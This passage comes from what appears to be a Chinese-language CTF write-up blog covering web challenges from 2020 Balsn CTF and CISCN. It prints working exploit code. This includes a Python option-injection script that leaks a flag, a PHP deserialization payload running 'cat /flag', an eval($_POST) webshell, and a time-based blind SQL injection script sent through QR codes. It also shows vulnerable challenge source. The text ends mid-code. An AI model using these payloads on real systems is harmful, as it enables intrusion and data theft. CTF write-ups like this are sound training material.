<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">host = <span class="string">&quot;windows-xp-media-player.balsnctf.com&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">req</span>(<span class="params">s, path</span>):</span></span><br><span class="line">    <span class="keyword">return</span> s.get(<span class="string">&quot;http://&#123;&#125;&#123;&#125;&quot;</span>.<span class="built_in">format</span>(host, path))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    s1 = requests.Session()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># create a session</span></span><br><span class="line">    resp = req(s1, <span class="string">&quot;/&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># use create playlist to generate the command `mkdir -p ./--output=/tmp/vakzz_in` </span></span><br><span class="line">    req(s1, <span class="string">&quot;/?args=-p ./--output=/tmp/vakzz_in&amp;op=create&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># also create a `-z` folder</span></span><br><span class="line">    req(s1, <span class="string">&quot;/?args=./-z&amp;op=create&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># use `--` so that the remaining args are not treated as options, will run `ls -- -z --output=/tmp/vakzz_in /flag/`</span></span><br><span class="line">    <span class="comment"># since all of these folders exist ls will exit cleanly and add our args to the queue</span></span><br><span class="line">    req(s1, <span class="string">&quot;/q/add?args=-- -z --output=/tmp/vakzz_in /flag/&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># remove the `--` from the queue</span></span><br><span class="line">    req(s1, <span class="string">&quot;/q/skip&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># shuffle the queue which will run `shuf -e -z --output=/tmp/vakzz_in /flag/`</span></span><br><span class="line">    <span class="comment"># this writes final argument as a null terminated string to the specified output file</span></span><br><span class="line">    req(s1, <span class="string">&quot;/q/shuf&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># now /tmp/vakzz_in contains `/flag/\x00`</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># rate limit</span></span><br><span class="line">    time.sleep(<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># new session as need more playlists</span></span><br><span class="line">    s2 = requests.Session()</span><br><span class="line">    resp = req(s2, <span class="string">&quot;/&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># create the folder `--files0-from=/tmp/vakzz_in` for option injection</span></span><br><span class="line">    req(s2, <span class="string">&quot;/?args=-p ./--files0-from=/tmp/vakzz_in&amp;op=create&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># create the folder `--exclude=flag?[1-9]*` for option injection</span></span><br><span class="line">    req(s2, <span class="string">&quot;/?args=./--exclude=flag?[1-9]*&amp;op=create&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># now `--files0-from=/tmp/vakzz_in` and `--exclude=flag?[1-9]*` are both in the names array and can be used in args</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># use stat to run `du` with our injection options, causing it to look at folders from /tmp/vakzz_in and exclude</span></span><br><span class="line">    <span class="comment"># anything that matches the supplied pattern: `du -sh --files0-from=/tmp/vakzz_in --exclude=flag?[1-9]*`</span></span><br><span class="line">    resp = req(s2, <span class="string">&quot;/?args=--files0-from=/tmp/vakzz_in --exclude=flag?[1-9]*&amp;op=stat&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># if the flag was excluded then this will return `8.0K    /flag/` otherwise `16K    /flag/`, letting us know if </span></span><br><span class="line">    <span class="comment"># the flag starts with 0-9 or a-f.</span></span><br><span class="line">    <span class="built_in">print</span>(resp.text.split(<span class="string">&#x27;&lt;div class=&quot;field-row&quot;&gt;&lt;label&gt;&#x27;</span>)[<span class="number">2</span>].split(<span class="string">&quot; &quot;</span>)[<span class="number">0</span>])</span><br></pre></td></tr></table></figure>





<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>反序列化在禁止\x00和*时，我们可以利用大写S来绕过对protected,private等属性的字符检测如：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:12:&quot;L5D_ResetCMD&quot;:2:&#123;s:7:&quot;padding&quot;;O:11:&quot;L5D_Command&quot;:0:&#123;&#125;S:10:&quot;\00\2a\00new_cmd&quot;;s:9:&quot;cat /flag&quot;;&#125;</span><br></pre></td></tr></table></figure>
      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/10/01/2020%20balsn%20ctf%20web%20%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/" data-id="cku8j3ffm0001dan7ae191i6g" data-title="2020 balsn ctf web 部分题解" class="article-share-link">Share</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web/" rel="tag">web</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-2020 ciscn 华东南 web" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2021/10/01/2020%20ciscn%20%E5%8D%8E%E4%B8%9C%E5%8D%97%20web/" class="article-date">
  <time class="dt-published" datetime="2021-10-01T15:35:42.668Z" itemprop="datePublished">2021-10-01</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2021/10/01/2020%20ciscn%20%E5%8D%8E%E4%B8%9C%E5%8D%97%20web/">2020 ciscn 华东南 web</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="2020-CISCN-华东南赛区"><a href="#2020-CISCN-华东南赛区" class="headerlink" title="2020 CISCN 华东南赛区"></a>2020 CISCN 华东南赛区</h1><h2 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zip -r is useful, and don&#x27;t forget /var/www/html/***********/cat.php</span><br></pre></td></tr></table></figure>

<p>访问<a target="_blank" rel="noopener" href="http://www.zip拿到源码/">www.zip拿到源码</a></p>
<p>利用<code>$msg = sprintf($msg, $value);     </code>打印文件上传位置<code>me0w_mE0w_miA0</code></p>
<p>访问<code>me0w_mE0w_miA0/cat.php</code>提示vim,拿到源码</p>
<p>cat.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;../waf.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line">session_start();</span><br><span class="line"><span class="comment">/*Login check*/</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$_SESSION</span>[<span class="string">&#x27;islogin&#x27;</span>])</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Who are you?&#x27;</span>);</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="comment">//class is waf~</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;h4 align=&#x27;center&#x27;&gt;Hello,ctfer&lt;/h4&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;h4 align=&#x27;center&#x27;&gt;But I am only a little cat......really?&lt;/h4&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&lt;div align=&quot;center&quot;&gt;&lt;img src=&quot;../images/cat2.jpg&quot; align=&quot;center&quot; /&gt;&lt;/div&gt;&lt;/br&gt;&#x27;</span>;</span><br><span class="line">    <span class="variable">$a</span>=<span class="keyword">new</span> waf();</span><br><span class="line">    spl_autoload_register();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&quot;filenames&quot;</span>]))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$a</span>-&gt;data=<span class="variable">$_COOKIE</span>[<span class="string">&quot;filenames&quot;</span>];</span><br><span class="line">        <span class="variable">$a</span>-&gt;upload_check();</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;h3 align=&#x27;center&#x27;&gt;The Winning Formula is complete!&lt;/h3&gt;&quot;</span>;</span><br><span class="line">        <span class="variable">$filenames</span>=unserialize(<span class="variable">$_COOKIE</span>[<span class="string">&quot;filenames&quot;</span>]);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$filenames</span>=<span class="string">&#x27;kee1ongz.meow&#x27;</span>;</span><br><span class="line">        file_put_contents(<span class="variable">$filenames</span>,<span class="string">&#x27; Meow~meow,meow~&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>spl_autoload_register();没有任何参数的情况下调用spl_autoload();</p>
<blockquote>
<ul>
<li><code>class_name</code></li>
</ul>
<ul>
<li><code>file_extensions</code></li>
</ul>
<p>在默认情况下，本函数先将类名转换成小写，再在小写的类名后加上 .inc       或 .php 的扩展名作为文件名，然后在所有的包含路径(include paths)中检查是否存在该文件。 </p>
</blockquote>
<p>上传fffffffffffuck.inc</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">	class fffffffffffuck&#123;</span><br><span class="line">		public function __wakeup()&#123;</span><br><span class="line">			eval($_POST[1]);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>



<p>反序列化:<code>O:13:&quot;ffffffffffuck&quot;:0:[]</code>，将{}换为:<code>[]</code>虽然反序列化失败，但是还是调用了<code>__wakeup</code></p>
<p>拿到flag:<code>ciscn&#123;keQXj78JHVUKjssqgD&#125;</code></p>
<h2 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h2><p>提示source.php,composer</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] === <span class="string">&#x27;127.0.0.1&#x27;</span>)&#123;</span><br><span class="line">        <span class="variable">$content</span> = file_get_contents(<span class="string">&#x27;php://filter/read=convert.base64-encode/resource=file:///var/www/html/excel.php&#x27;</span>);</span><br><span class="line">        file_get_contents(<span class="string">&#x27;http://&#x27;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>].<span class="string">&#x27;/?&#x27;</span>.<span class="variable">$content</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;only for localhost&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>composer.json</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;require&quot;: &#123;</span><br><span class="line">        &quot;phpoffice/phpspreadsheet&quot;: &quot;1.5.0&quot;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>hint给你excel.php的源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;vendor/autoload.php&#x27;</span>;</span><br><span class="line"><span class="variable">$r</span> = \PhpOffice\PhpSpreadsheet\IOFactory::createReader(<span class="string">&#x27;Xlsx&#x27;</span>);</span><br><span class="line"><span class="variable">$r</span>-&gt;setReadDataOnly(<span class="literal">TRUE</span>);</span><br><span class="line"><span class="variable">$fileInfo</span> = <span class="variable">$_FILES</span>[<span class="string">&quot;filename&quot;</span>];</span><br><span class="line"><span class="variable">$filePath</span> = <span class="variable">$fileInfo</span>[<span class="string">&quot;tmp_name&quot;</span>];</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line"><span class="variable">$data</span> = <span class="variable">$r</span>-&gt;load(<span class="variable">$filePath</span>)-&gt;getSheet(<span class="number">0</span>)-&gt;toArray(); </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span> (<span class="built_in">Exception</span> <span class="variable">$e</span>) &#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;illegal xlsx file!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$s</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$s</span> = <span class="variable">$s</span>.<span class="string">&#x27;&lt;table&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$data</span> <span class="keyword">as</span> <span class="variable">$a</span>)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="variable">$s</span> = <span class="variable">$s</span>.<span class="string">&#x27;&lt;tr&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$i</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$s</span> = <span class="variable">$s</span>.<span class="string">&quot;&lt;td style=\&quot;text-align:center\&quot;&gt;&lt;h2&gt;&quot;</span>.<span class="variable">$i</span>.<span class="string">&quot;&lt;/h2&gt;&lt;/td&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$s</span> = <span class="variable">$s</span>.<span class="string">&#x27;&lt;/tr&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="variable">$s</span> = <span class="variable">$s</span>.<span class="string">&#x27;&lt;/table&gt;&#x27;</span>;</span><br><span class="line">stream_wrapper_unregister(<span class="string">&#x27;php&#x27;</span>);</span><br><span class="line">chdir(<span class="string">&#x27;users/&#x27;</span>);</span><br><span class="line"><span class="variable">$fd</span> = (<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>])?<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>]:<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">mkdir(<span class="variable">$fd</span>);</span><br><span class="line"><span class="comment">//data:</span></span><br><span class="line">chdir(<span class="variable">$fd</span>);</span><br><span class="line">file_put_contents(<span class="string">&#x27;profile&#x27;</span>,<span class="variable">$s</span>);</span><br><span class="line"><span class="variable">$f</span> = basename(getcwd()).<span class="string">&#x27;/profile&#x27;</span>;</span><br><span class="line"><span class="comment">//data:,/profile</span></span><br><span class="line">chdir(<span class="string">&#x27;..&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(!stripos(file_get_contents(<span class="variable">$f</span>),<span class="string">&#x27;&lt;?&#x27;</span>) &amp;&amp; !stripos(file_get_contents(<span class="variable">$f</span>),<span class="string">&#x27;php&#x27;</span>)) &#123;</span><br><span class="line">	<span class="keyword">include</span>(<span class="variable">$f</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">die</span>(<span class="string">&#x27;no!&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>file_get_contents在处理data:,xxxxxx时会直接取xxxxxx<br>而include会包含文件名为data:,xxxxxx的文件</p>
<p>但是我们无法直接创建<code>data:</code>的文件夹</p>
<p>先用<code>./data:</code>创建<code>data:</code>文件夹</p>
<p>再用<code>data:</code>来绕过<code>if(!stripos(file_get_contents($f),&#39;&lt;?&#39;) &amp;&amp; !stripos(file_get_contents($f),&#39;php&#39;))</code></p>
<h2 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h2><p><a target="_blank" rel="noopener" href="http://www.zip直接下载,翻源码审计./">www.zip直接下载，翻源码审计。</a></p>
<p>登录这边看这login.php构造一下符合正则规则的参数就好了，登了取下sessionid</p>
<p>然后qr.php里，sql注入明显的点，直接拼接的，<code>$data</code>来自于扫描二维码得到的数据，二维码里是个json：<code>&#123;&quot;id&quot;:&quot;xxxx&quot;&#125;</code>。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;insert into record(p_id, userid)values (&#x27;&quot;</span>.<span class="variable">$data</span>[<span class="string">&#x27;id&#x27;</span>].<span class="string">&quot;&#x27;,&#x27;&quot;</span>.<span class="variable">$user</span>-&gt;getCardID().<span class="string">&quot;&#x27;);&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>写盲注脚本爆破一下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests, time</span><br><span class="line"><span class="keyword">import</span> qrcode</span><br><span class="line"><span class="keyword">from</span> requests.adapters <span class="keyword">import</span> HTTPAdapter</span><br><span class="line"></span><br><span class="line">SQL = <span class="string">&quot;(select group_concat(flag) from flag)&quot;</span></span><br><span class="line">GETCONTENT = <span class="string">&quot;&#x27;or(if( ascii(substr((&quot;</span> + SQL + <span class="string">&quot;),%d,1)) &lt;= %d, sleep(5), 0))or&#x27;&quot;</span></span><br><span class="line">GETLENGTH = <span class="string">&quot;&#x27;or(if( length((&quot;</span> + SQL + <span class="string">&quot;)) &lt;= %d, sleep(5), 0))or&#x27;&quot;</span></span><br><span class="line"></span><br><span class="line">THRESHOLD = <span class="number">5</span></span><br><span class="line">STRLEN = <span class="number">32</span></span><br><span class="line"></span><br><span class="line">session = requests.Session()</span><br><span class="line"></span><br><span class="line">session.mount(<span class="string">&#x27;http://&#x27;</span>, HTTPAdapter(max_retries=<span class="number">10</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">guess</span>(<span class="params">payload, strpos=<span class="literal">None</span></span>):</span></span><br><span class="line">    l = <span class="number">0</span></span><br><span class="line">    r = <span class="number">255</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> l &lt; r:</span><br><span class="line">        mid = (l+r)//<span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> strpos <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            sql = payload % (mid)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            sql = payload % (strpos, mid)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> check(sql) == <span class="literal">True</span>:</span><br><span class="line">            r = mid</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;guess &lt;=&#x27;</span>, r)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            l = mid + <span class="number">1</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;guess &gt;&#x27;</span>, l)</span><br><span class="line">    <span class="keyword">return</span> l</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span>(<span class="params">payload</span>):</span></span><br><span class="line"></span><br><span class="line">    qr = qrcode.make(<span class="string">&#x27;&#123;&quot;id&quot;:&quot;&#x27;</span> + payload + <span class="string">&#x27;&quot;&#125;&#x27;</span>)</span><br><span class="line">    qr.save(<span class="string">&#x27;qr.png&#x27;</span>)</span><br><span class="line">    start = time.perf_counter()</span><br><span class="line">    x = session.post(</span><br><span class="line">        url=<span class="string">&#x27;http://172.20.6.103/qr.php&#x27;</span>,</span><br><span class="line">        cookies=&#123;</span><br><span class="line">            <span class="string">&#x27;PHPSESSID&#x27;</span>: <span class="string">&#x27;fe940a8329992285f77487f96c575d29&#x27;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        files=&#123;</span><br><span class="line">            <span class="string">&quot;file&quot;</span>: <span class="built_in">open</span>(<span class="string">&quot;qr.png&quot;</span>, <span class="string">&quot;rb&quot;</span>),</span><br><span class="line">            <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/octet-stream&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Content-Disposition&quot;</span>: <span class="string">&quot;form-data&quot;</span>,</span><br><span class="line">            <span class="string">&quot;filename&quot;</span>: <span class="string">&quot;qr.png&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        timeout=(<span class="number">2</span>, <span class="number">8</span>)</span><br><span class="line">    )</span><br><span class="line">    end = time.perf_counter()</span><br><span class="line">    <span class="built_in">print</span>(payload, end-start)</span><br><span class="line">    <span class="keyword">if</span> end-start &gt; THRESHOLD:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getlength</span>():</span></span><br><span class="line">    <span class="keyword">global</span> STRLEN</span><br><span class="line">    STRLEN = guess(GETLENGTH)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;LEN:&#x27;</span>, STRLEN)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getcontent</span>():</span></span><br><span class="line">    content = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> strpos <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, STRLEN+<span class="number">1</span>):</span><br><span class="line">        ch = guess(GETCONTENT, strpos)</span><br><span class="line"></span><br><span class="line">        content += <span class="built_in">chr</span>(ch)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;CHR:&#x27;</span>, <span class="built_in">chr</span>(ch), <span class="string">&#x27;CONTENT:&#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    getlength()</span><br><span class="line">    getcontent()</span><br></pre></td></tr></table></figure>



<h2 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class GetPass</span><br><span class="line">&#123;&#125;</span><br><span class="line">class Upload</span><br><span class="line">&#123;&#125;</span><br><span class="line">$y1ng = new GetPass;</span><br><span class="line">$y1ng-&gt;abandon = new GetPass;</span><br><span class="line">$y1ng-&gt;abandon-&gt;abandon =new Upload;</span><br><span class="line">$y1ng-&gt;abandon-&gt;boring =&quot;1&quot;;</span><br><span class="line">$y1ng-&gt;abandon-&gt;code =&quot;1&quot;;</span><br><span class="line"></span><br><span class="line">$y1ng-&gt;boring = &#x27;read&#x27;;</span><br><span class="line">$y1ng-&gt;code = &#x27;hidden&#x27;;</span><br><span class="line"></span><br><span class="line">$c = new GetPass;</span><br><span class="line">$c-&gt;abandon = new GetPass;</span><br><span 